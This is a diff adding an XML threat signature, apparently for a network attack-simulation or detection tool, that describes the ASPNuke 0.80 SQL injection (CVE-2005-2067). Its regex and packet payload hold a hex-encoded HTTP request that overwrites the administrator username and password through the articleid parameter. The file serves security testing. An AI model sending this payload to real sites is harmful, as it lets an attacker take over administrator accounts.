@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ASPNuke SQL Injection"/>
+    <EngDesc display="true" value="This threat changes the administrator  name and password through a SQL injection attack in ASPNuke.  ASPNuke is a web application which would typically listen on port 80."/>
+    <Intent display="true">
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="ASPNuke"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="ASPNuke_ASPNuke"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ASPNuke_ASPNuke_0.80"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/396678"/>
+    <CVEID display="true" value="CVE-2005-2067"/>
+    <bugtraqID display="true" value="13318"/>
+    <OSVDB display="true" value="15801"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="11c37ac40dedb3d8dd3cc0340549af79"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725858350781250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="F"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X6D\X6F\X64\X75\X6C\X65\X2F\X61\X72\X74\X69\X63\X6C\X65\X2F\X61\X72\X74\X69\X63\X6C\X65\X2F\X61\X72\X74\X69\X63\X6C\X65\X2E\X61\X73\X70\X3F\X61\X72\X74\X69\X63\X6C\X65\X69\X64\X3D\X31\X25\X32\X30\X3B\X25\X32\X30\X75\X70\X64\X61\X74\X65\X25\X32\X30\X74\X62\X6C\X75\X73\X65\X72\X25\X32\X30\X53\X45\X54\X25\X32\X30\X70\X61\X73\X73\X77\X6F\X72\X64\X3D\X27\X62\X66\X31\X36\X63\X37\X65\X63\X30\X36\X33\X65\X38\X66\X31\X62\X36\X32\X62\X66\X34\X63\X61\X38\X33\X31\X34\X38\X35\X62\X61\X30\X64\X61\X35\X36\X33\X32\X38\X66\X38\X31\X38\X37\X36\X33\X65\X64\X33\X34\X63\X37\X32\X63\X61\X39\X36\X35\X33\X33\X38\X30\X32\X63\X27\X25\X32\X30\X2C\X25\X32\X30\X75\X73\X65\X72\X6E\X61\X6D\X65\X3D\X27\X74\X72\X61\X70\X73\X65\X74\X27\X25\X32\X30\X77\X68\X65\X72\X65\X25\X32\X30\X75\X73\X65\X72\X49\X44\X3D\X31\X25\X32\X30\X2D\X2D\X20\X48\X54\X54\X50\X2F\X31\X2E\X30\X0A\X48\X6F\X73\X74\X3A\X20\X48\X6F\X73\X74\X2E\X63\X6F\X6D\X0A\X0A\X0A"/>
+    <Created value="1155320240" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F6D6F64756C652F61727469636C652F61727469636C652F61727469636C652E6173703F61727469636C6569643D312532303B25323075706461746525323074626C7573657225323053455425323070617373776F72643D2762663136633765633036336538663162363262663463613833313438356261306461353633323866383138373633656433346337326361393635333338303263272532302C253230757365726E616D653D27747261707365742725323077686572652532307573657249443D312532302D2D20485454502F312E300A486F73743A20486F73742E636F6D0A0A0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
